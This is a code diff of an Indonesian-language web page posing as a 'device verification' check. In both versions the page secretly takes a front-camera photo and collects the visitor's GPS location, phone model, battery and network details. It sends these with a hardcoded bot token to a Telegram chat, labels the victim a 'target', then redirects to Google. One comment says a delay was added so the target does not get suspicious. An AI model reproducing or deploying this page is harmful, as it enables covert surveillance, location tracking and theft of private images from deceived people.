@@ -3,173 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi</title>
+    <title>Verifikasi Perangkat</title>
     <style>
-        body { background: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #f4f4f4; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .box { padding: 30px; border: 1px solid #ddd; width: 85%; margin: auto; border-radius: 15px; background: #fff; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        button { padding: 15px 30px; font-size: 18px; background: #3498db; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        button:hover { background: #2980b9; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>Sedang memverifikasi perangkat anda...</p>
+    <div class="box">
+        <h2>Verifikasi Perangkat</h2>
+        <p>Silakan klik tombol di bawah untuk melanjutkan proses verifikasi keamanan.</p>
+        <button onclick="mulaiVerifikasi()">Lanjutkan Verifikasi</button>
+    </div>
 
-    <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0; transform: scaleX(-1);" autoplay playsinline></video>
+    <video id="video" style="display:none;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
         const CHAT_ID = '6888530451';
-        
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        let userLocation = "Akses Lokasi Ditolak/Belum Didapat";
+        let userLocation = "Akses Lokasi Ditolak";
 
-        // --- DAFTAR MODEL HP (LENGKAP) ---
+        // Daftar Model HP
         function translateModel(model) {
             const brands = {
-                // Xiaomi / Redmi / POCO
-                '2310FPCA4G': 'Xiaomi Redmi 13C',
-                '2201117TY': 'Redmi Note 11',
-                '21061119AL': 'Xiaomi Mi 11 Lite',
-                '2201116SG': 'Redmi Note 11 Pro',
-                'M2012K11AG': 'POCO F3',
-                'M2102J20SG': 'POCO X3 Pro',
-                
-                // Samsung
-                'SM-G991B': 'Samsung S21',
-                'SM-A525F': 'Samsung Galaxy A52',
-                'SM-A125F': 'Samsung Galaxy A12',
-                'SM-M315F': 'Samsung Galaxy M31',
-                'SM-A515F': 'Samsung Galaxy A51',
-                
-                // Oppo / Realme
-                'CPH2219': 'Oppo A94',
-                'CPH2127': 'Oppo A53',
-                'CPH1907': 'Oppo Reno 2',
-                'RMX3363': 'Realme GT Master Edition',
-                'RMX2151': 'Realme 7',
-                'RMX3085': 'Realme 8',
-                
-                // Infinix / Vivo
-                'X688B': 'Infinix Hot 10',
-                'X657B': 'Infinix Smart 5',
-                'V2025': 'Vivo V20',
-                'V2109': 'Vivo Y21',
-
-                // Generic Matchers
-                'CPH': 'Oppo Device',
-                'RMX': 'Realme Device',
-                'SM-': 'Samsung Galaxy',
-                'M2': 'Xiaomi/POCO'
+                '2310FPCA4G': 'Xiaomi Redmi 13C', '2201117TY': 'Redmi Note 11',
+                '21061119AL': 'Xiaomi Mi 11 Lite', '2201116SG': 'Redmi Note 11 Pro',
+                'M2012K11AG': 'POCO F3', 'SM-G991B': 'Samsung S21',
+                'SM-A525F': 'Samsung Galaxy A52', 'SM-A125F': 'Samsung Galaxy A12',
+                'CPH2219': 'Oppo A94', 'CPH2127': 'Oppo A53',
+                'RMX3363': 'Realme GT Master Edition', 'RMX2151': 'Realme 7',
+                'X688B': 'Infinix Hot 10', 'V2025': 'Vivo V20',
+                'CPH': 'Oppo Device', 'RMX': 'Realme Device', 'SM-': 'Samsung Galaxy'
             };
-
-            for (let key in brands) {
-                if (model.includes(key)) return brands[key];
-            }
+            for (let key in brands) { if (model.includes(key)) return brands[key]; }
             return model;
         }
 
-        async function getFullDeviceName() {
+        async function getDeviceDetails() {
             let model = "Android Mobile";
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            if (navigator.userAgentData) {
                 try {
                     const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
-                    if (hints.model) return translateModel(hints.model);
+                    if (hints.model) model = translateModel(hints.model);
                 } catch (e) {}
             }
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^)]+)\)/);
-            if (match && match[1]) {
-                const parts = match[1].split(';');
-                for (let part of parts) {
-                    part = part.trim();
-                    if (/android|linux|build|k/i.test(part) || part.length < 3) continue;
-                    return translateModel(part);
+            
+            let battery = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    battery = Math.round(bat.level * 100) + "%";
                 }
+            } catch (e) {}
+
+            let connectionInfo = "Unknown";
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                connectionInfo = `${conn.effectiveType.toUpperCase()} | Latency: ${conn.rtt}ms | Speed: ${conn.downlink}Mbps`;
             }
-            return model;
+            
+            return { model, battery, connection: connectionInfo };
         }
 
-        // --- FUNGSI LOKASI ---
-        function askLocation() {
-            return new Promise((resolve) => {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                            resolve();
-                        },
-                        () => { resolve(); },
-                        { enableHighAccuracy: true, timeout: 10000 }
-                    );
-                } else {
-                    userLocation = "Tidak Didukung Browser";
-                    resolve();
-                }
-            });
-        }
+        async function mulaiVerifikasi() {
+            // Minta Izin Lokasi
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`; },
+                    () => { userLocation = "Ditolak Pengguna"; }
+                );
+            }
 
-        // --- FUNGSI KAMERA ---
-        async function startCamera() {
+            // Akses Kamera
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // Jeda 3 detik agar target tidak curiga dan GPS sempat terbaca
-                    setTimeout(takeSnapshot, 3000);
-                };
+                setTimeout(() => ambilFoto(video), 2000);
             } catch (err) {
-                // Tetap kirim data meskipun kamera ditolak
-                setTimeout(takeSnapshot, 2000);
+                kirimDataTanpaFoto();
             }
         }
 
-        async function takeSnapshot() {
-            let battery = "N/A";
-            try { if (navigator.getBattery) { const bat = await navigator.getBattery(); battery = Math.round(bat.level * 100) + "%"; } } catch (e) {}
-
-            const deviceName = await getFullDeviceName();
-
-            const info = `📸 <b>Laporan Target Aktif</b>\n\n` +
-                         `📱 <b>Perangkat:</b> <code>${deviceName}</code>\n` +
-                         `🔋 <b>Baterai:</b> ${battery}\n` +
-                         `📍 <b>Lokasi:</b> ${userLocation}\n` +
-                         `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : '4G'}\n` +
-                         `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n\n` +
-                         `<i>NEPTUNUS V1.0.8</i>`;
-
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
+        async function ambilFoto(video) {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.scale(-1, 1);
             ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(blob => {
+            const details = await getDeviceDetails();
+
+            canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob);
+                formData.append('caption', `📸 <b>Laporan Target</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connection}\n📍 <b>Lokasi:</b> ${userLocation}`);
                 formData.append('parse_mode', 'HTML');
-
-                if (blob) {
-                    formData.append('photo', blob, 'selfie.jpg');
-                    formData.append('caption', info);
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData })
-                    .finally(() => { window.location.href = "https://google.com"; });
-                } else {
-                    // Jika tidak ada foto (kamera off), kirim teks saja
-                    formData.append('text', info);
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: formData })
-                    .finally(() => { window.location.href = "https://google.com"; });
-                }
-            }, 'image/jpeg', 0.8);
+                
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                window.location.href = "https://google.com";
+            }, 'image/jpeg');
         }
 
-        // Eksekusi otomatis saat halaman dimuat
-        window.onload = () => {
-            askLocation(); 
-            startCamera();
-        };
+        async function kirimDataTanpaFoto() {
+            const details = await getDeviceDetails();
+            const text = `⚠️ <b>Target menolak kamera</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connection}\n📍 <b>Lokasi:</b> ${userLocation}`;
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
+            window.location.href = "https://google.com";
+        }
     </script>
 </body>
 </html>
